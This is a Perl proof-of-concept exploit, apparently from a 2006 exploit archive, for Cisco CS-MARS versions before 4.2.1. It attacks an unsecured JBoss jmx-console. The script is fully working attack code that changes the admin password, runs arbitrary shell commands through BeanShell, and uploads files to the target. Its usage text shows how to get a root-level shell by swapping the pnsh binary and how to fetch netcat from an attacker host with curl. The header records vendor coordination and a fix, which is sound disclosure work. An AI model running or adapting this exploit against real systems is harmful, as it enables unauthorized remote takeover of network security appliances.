#!/usr/bin/perl
# 
# Cisco/Protego CS-MARS < 4.2.1 remote command execution, system compromise
# via insecure JBoss installation.
#
# Fully functional POC code by Jon Hart <jhart@spoofed.org>
#
# Addressed in CSCse47646
#
# CS-MARS is an event correlation product orginally written by Protego,
# which is now owned by Cisco.  It is built on top of JBoss.
# Unfortunately, little or no effort was put in to securing the JBoss
# installation as per the JBoss community's recommended best practices.
# A such, the usual set of JBoss interfaces are wide open and it is up to
# the attacker how creative they want to be in compromising the box.  This
# particular exploit vector abuses the JBoss jmx-console for all sorts of
# fun.  It should also be noted that, because of the very old kernel
# running on most CS-MARS boxes (2.4.9), once JBoss is compromised, root is
# almost trivial.  Thanks to Cisco PSIRT and Matt Cerha for their
# cooperation in getting this fixed.
#
#################################
#  Copyright (C) 2006 Jon Hart
#
#  This program is free software; you can redistribute it and/or modify it
#  under the terms of the GNU General Public License as published by the Free
#  Software Foundation; either version 2 of the License, or (at your option)
#  any later version.
#
#  This program is distributed in the hope that it will be useful, but WITHOUT
#  ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or
#  FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for
#  more details.
#
#  You should have received a copy of the GNU General Public License along with
#  this program; if not, write to the Free Software Foundation, Inc., 59 Temple
#  Place, Suite 330, Boston, MA 02111-1307 USA
#
#
#################################
#

use strict;
use HTTP::Request::Common;
use LWP::UserAgent;
use IO::Socket;

my $target = shift(@ARGV) || &usage;
my $attack_type = shift(@ARGV) || &usage; 

for ($attack_type) {
   if    (/pass/) { &change_passwd(@ARGV); }
   elsif (/cmd/) { &run_cmd(@ARGV); }
   elsif (/upload/) { &upload(@ARGV); }
   elsif (/[bean|bsh]/) { &run_bsh(@ARGV); }
   else { &usage; }
} 

sub change_passwd {
   my $passwd = shift;
   &run_cmd("/opt/janus/release/bin/pnpasswd $passwd");
}

sub encode {
   my $en = shift;
   my $string = "";
   foreach my $char (split(//, $en)) {
      if ($char =~ /([:|\/|(|)|"|'|`| ])/) {
         $string .= sprintf("%%%x", ord($1));
      } else { $string .= $char; }
   }
   return $string;
}

sub jmx_post {
   my $form_data = shift; 
   my $ua = LWP::UserAgent->new;
   $ua->agent("Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)");
   my $req = HTTP::Request->new(POST => "http://$target/jmx-console/HtmlAdaptor");
   $req->content_type('application/x-www-form-urlencoded');
   $req->content(&encode($form_data));

   my $res = $ua->request($req);

   return $res->is_success ? 0 : $res->status_line;
}

sub run_bsh {
   my $file = shift;
   my $bsh = "";
   open(BSH, "$file") or die "Couldn't open $file: $!\n";
   print("Sending beanshell from $file: ");
   while (<BSH>) {
      # the bsh must be one long string...
      chomp();
      $bsh .= $_;
   }
   
   printf("%s\n", &send_beanshell($bsh) == 0 ? "Success" : "Failed");
}

sub run_cmd {
   my $cmd = shift; 
   my $code = "";
  
   # & in the command needs to be encoded so as to not be confused with the &
   # in the URI
   $cmd =~ s/&/%26/g;
   if ($cmd =~ />|\||&/) {
      # exec() does not handle pipes or redirection well, so do this instead
      $code = 'String sh = "/bin/sh"; String opt = "-c"; String cmd = "'
            . $cmd .
            '"; String[] exec = new String[] { sh, opt, cmd }; Runtime.getRuntime().exec(exec);';
   } else {
      $code = "Runtime.getRuntime().exec(\"$cmd\");";
   }

   print("Running '$cmd' on $target: ");
   printf("%s\n", &send_beanshell($code) == 0 ? "Success" : "Failed!");
}

sub send_beanshell {
   my $code = shift;
   # ensure the name of the bsh job within java has a unique name
   my $name = "cmd" . int(rand(65535)) . $$;
   return &jmx_post("action=invokeOp&name=jboss.scripts:service=BSHDeployer&methodIndex=1&arg0=$code&arg1=$name");
}

sub upload {
   # upload a file.  I was too lazy to use org.jboss.console.manager.DeploymentFileRepository
   my $file = shift;
   my $path = shift;
   my $new_name = shift;
   my $chunk = "";
   my $ret = 0;
   open(FILE, "< $file") or die "Couldn't open $file for reading: $!\n";

   if (!(defined($new_name))) {
      my @path = split(/\//, $file);
      $new_name = $path[$#path];
   }

   print("Uploading $file to $target...\n");
   &run_cmd("touch $path/$new_name");
   while(read(FILE,$chunk,4096)) {
      # encode this file in 4096 byte chunks in a format that is able to be handled by JBoss.
      # There are plenty of ways to do this, but none that were both portable and that didn't make JBoss 
      # throw a 500 or otherwise botch the file.  UGLY.
      $chunk = join('', map { sprintf("%03d,", ord("$_")) } split(//, $chunk));
      $ret += &run_cmd("echo -n $chunk | perl -ne 'foreach (split(/,/, \$_)) { print chr(\$_); }' >> $path/$new_name");
   }

   printf("Upload of $file to $target:$path/new_name %s!\n", $ret == 0 ? "succeeded" : "failed");
}


sub usage {
   print <<EOF;
   Cisco MARS (CS-MARS) < 4.2.1 JBoss exploit (CSCse47646) POC by Jon Hart <jhart\@spoofed.org>

   Basic Usage:
      $0 <target> <exploit_type> [<exploit_specific_args] ...]

   Extended Usage:
      Change password:
      $0 <target> pass <password>
      Run shell command:
      $0 <target> cmd <your quoted shell command>
      Run BeanShell code:
      $0 <target> bsh /path/to/file/with/beanshell
      Upload files:
      $0 <target> upload <file to upload> <path on target> [<new name>]

      Fun Stuff:
         Get a real shell:
         $0 <target> cmd "cp /opt/janus/release/bin/pnsh /opt/janus/release/bin/pnsh.bak"
         $0 <target> cmd "rm  /opt/janus/release/bin/pnsh"
         $0 <target> cmd "cp /bin/sh /opt/janus/release/bin/pnsh"
         # now ssh to the target...
         [pnadmin\@pnmars bin]\$ id
         uid=501(pnadmin) gid=501(pnadmin) groups=501(pnadmin)
         [pnadmin\@pnmars bin]\$ uname -a
         Linux pnmars 2.4.9-e.57 #1 Thu Dec 2 20:56:19 EST 2004 i686 unknown
         [pnadmin\@pnmars bin]\$ hostname
         pnmars
         
         Download something:
         $0 <target> cmd "curl http://yourhost/nc -o /tmp/nc"

EOF
exit(1);
}

# milw0rm.com [2006-07-20]
